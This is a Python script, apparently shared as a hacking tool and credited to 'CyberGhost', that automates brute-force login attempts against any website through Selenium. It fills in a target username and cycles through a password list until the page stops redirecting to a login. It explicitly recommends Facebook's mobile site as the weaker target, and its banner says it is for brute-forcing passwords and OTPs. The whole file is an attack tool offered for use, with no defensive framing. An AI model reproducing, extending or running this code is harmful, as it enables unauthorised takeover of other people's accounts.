import selenium
import requests
import time
import os
from selenium import webdriver

white='\033[37;1m'
red='\033[31;1m'
green='\033[32;1m'
yellow='\033[33;1m'
default='\033[m'


def hackingpasswords():
    site=input(yellow+"Please enter website name: "+white)
    if 'facebook' in site:
        site='https://m.facebook.com'
        print('It is better to perform bruteforce with the m.facebook.com than web.facebook.com')
        print("The security in web.facebook.com is high") 
    checking_site=requests.get(site)
    if (checking_site.status_code==int(200)):
        print(green + site,' do exist \u2713')
        browser=webdriver.Firefox()
        browser.get(site)
        uname_selector=input(yellow+'Please enter "USERNAME CSS SELECTOR" : '+white)
        uname=input(yellow+'Please enter Username: '+white)
        password_selector=input(yellow+'Please enter "PASSWORD CSS SELECTOR" : '+white)
        submit=input(yellow+"Please enter 'LOGIN CSS SELECTOR' : "+white)
        password_guess=input(yellow+"Please enter file location of your password list if you have else hit enter to use defaut password list: " +white)
        if password_guess=='':
            password_dir=os.getcwd()
            password_guess=password_dir+'/passlist.txt'
        pass_file=open(password_guess,'r')
        while True:
            for guess in pass_file:
                user=browser.find_element_by_css_selector(uname_selector)
                user.clear()
                user.send_keys(uname)
                pazword=browser.find_element_by_css_selector(password_selector)
                pazword.clear()
                pazword.send_keys(guess)
                login=browser.find_element_by_css_selector(submit)
                login.click()
                time.sleep(5)
                print(white+"*"*30)
                print(green+'password tried: %s'%(guess))
                webname=browser.current_url
                if webname==site or 'login' in webname:
                    print(yellow+'Password not found'+red+'\u2717')
                    print(white+"*"*30)
                    pass
                else:
                    print(green+'Password Found! : %s'%(guess))
                    print(white+"*"*30)
                    print("Have a nice day")
                    exit()


    else:
        print(red + site, 'do not exist \u2717')
        exit()
welcome='''
|*****  |*****   ||    || ****||*****   **|   ****** |*****            
||**| * ||**| *  ||    || ****||*****  ** |  * ***** | |***          
| *** * | **  *  ||    ||     ||     **   | | *      | |                                                                            
|*****  ||****   ||    ||     ||    **    | | |      | |***                                   
||**| * ||   **  | *  * |     ||   *******| | |      | |                                                                               
| *** * ||    **  * ** *      ||  ********|  * * **  | ****                                                                                 
******  *      **  ****       **          *   *****  *******

created by: CyberGhost
date:19-october-2019
Description:This script is written in python3 language\n and is used to bruteforce passwords and otp


'''
print(red+welcome+default)


hackingpasswords()
